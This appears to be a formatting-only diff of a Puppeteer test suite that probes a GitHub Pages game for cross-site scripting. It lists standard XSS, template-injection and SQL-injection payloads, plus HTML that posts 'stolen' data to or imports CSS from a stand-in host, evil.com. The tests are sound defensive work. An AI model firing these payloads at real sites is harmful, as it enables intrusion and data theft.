@@ -24,8 +24,8 @@ describe('XSS Prevention Tests', () => {
         'chrome://settings',
         '<script>alert("xss")</script>',
         '"><script>alert(String.fromCharCode(88,83,83))</script>',
-        '\'-alert(1)-\'',
-        '\'><script>alert(String.fromCharCode(88,83,83))</script>',
+        "'-alert(1)-'",
+        "'><script>alert(String.fromCharCode(88,83,83))</script>",
         '"><img src=x onerror=alert(1)>',
         '<svg/onload=alert(1)>',
         '<iframe src=javascript:alert(1)>',
@@ -53,22 +53,25 @@ describe('XSS Prevention Tests', () => {
         '%253Cscript%253Ealert(1)%253C/script%253E',
         '&lt;script&gt;alert(1)&lt;/script&gt;',
         '&#60;script&#62;alert(1)&#60;/script&#62;',
-        '&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;'
+        '&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;',
       ];
 
       for (const payload of xssPayloads) {
         try {
           // Test navigation with XSS payload
-          const response = await page.goto(`https://williamzujkowski.github.io/paperclips/index2.html?param=${encodeURIComponent(payload)}`, {
-            waitUntil: 'networkidle0',
-            timeout: 5000
-          });
+          const response = await page.goto(
+            `https://williamzujkowski.github.io/paperclips/index2.html?param=${encodeURIComponent(payload)}`,
+            {
+              waitUntil: 'networkidle0',
+              timeout: 5000,
+            },
+          );
 
           // Check if page loaded without executing XSS
           expect(response?.status()).toBe(200);
 
           // Check for alert dialogs
-          const alertFired = await new Promise(resolve => {
+          const alertFired = await new Promise((resolve) => {
             page.once('dialog', () => resolve(true));
             setTimeout(() => resolve(false), 1000);
           });
@@ -93,20 +96,20 @@ describe('XSS Prevention Tests', () => {
 
       const maliciousSelectors = [
         '"><script>alert(1)</script>',
-        '\' or \'1\'=\'1',
+        "' or '1'='1",
         '`; alert(1); //`',
         '${alert(1)}',
-        '{{constructor.constructor(\'alert(1)\')()}}',
+        "{{constructor.constructor('alert(1)')()}}",
         'img[src=x onerror=alert(1)]',
         '*[onclick="alert(1)"]',
-        'a[href="javascript:alert(1)"]'
+        'a[href="javascript:alert(1)"]',
       ];
 
       for (const selector of maliciousSelectors) {
         try {
           // Attempt to use malicious selector
           const elements = await page.$$(selector);
-          
+
           // If selector is processed, it should return empty or throw error
           expect(elements.length).toBe(0);
         } catch (error) {
@@ -131,18 +134,18 @@ describe('XSS Prevention Tests', () => {
         'Function("alert(1)")()',
         'setTimeout("alert(1)", 0)',
         'setInterval("alert(1)", 1000)',
-        'new Function("alert(1)")()'
+        'new Function("alert(1)")()',
       ];
 
       for (const script of dangerousScripts) {
         try {
           // Scripts should be executed in a sandboxed context
           const result = await page.evaluate(script);
-          
+
           // Check that dangerous operations didn't succeed
           const url = await page.url();
           expect(url).toContain('williamzujkowski.github.io');
-          
+
           // Check cookies weren't modified
           const cookies = await page.cookies();
           expect(cookies).not.toContainEqual(expect.objectContaining({ name: 'stolen' }));
@@ -169,7 +172,7 @@ describe('XSS Prevention Tests', () => {
         '<form action="http://evil.com"><input name="data" value="stolen"></form>',
         '<!--[if IE]><script>alert(1)</script><![endif]-->',
         '<style>@import "http://evil.com/xss.css";</style>',
-        '<style>body{background:url("javascript:alert(1)")}</style>'
+        '<style>body{background:url("javascript:alert(1)")}</style>',
       ];
 
       for (const payload of htmlPayloads) {
@@ -181,7 +184,7 @@ describe('XSS Prevention Tests', () => {
         }, payload);
 
         // Check for alert dialogs
-        const alertFired = await new Promise(resolve => {
+        const alertFired = await new Promise((resolve) => {
           page.once('dialog', () => resolve(true));
           setTimeout(() => resolve(false), 500);
         });
@@ -229,14 +232,14 @@ describe('XSS Prevention Tests', () => {
               document.body.appendChild(el);
             }, tag);
 
-            const alertFired = await new Promise(resolve => {
+            const alertFired = await new Promise((resolve) => {
               page.once('dialog', () => resolve(true));
               setTimeout(() => resolve(false), 100);
             });
 
             expect(alertFired).toBe(false);
           }
-        }
+        },
       ];
 
       for (const test of domXSSTests) {
@@ -251,7 +254,7 @@ describe('XSS Prevention Tests', () => {
         '<script>alert(1)</script>',
         '<img src=x onerror=alert(1)>',
         'javascript:alert(1)',
-        '<svg onload=alert(1)>'
+        '<svg onload=alert(1)>',
       ];
 
       for (const payload of xssPayloads) {
@@ -264,7 +267,7 @@ describe('XSS Prevention Tests', () => {
         await page.reload();
 
         // Check if stored payload gets executed
-        const alertFired = await new Promise(resolve => {
+        const alertFired = await new Promise((resolve) => {
           page.once('dialog', () => resolve(true));
           setTimeout(() => resolve(false), 1000);
         });
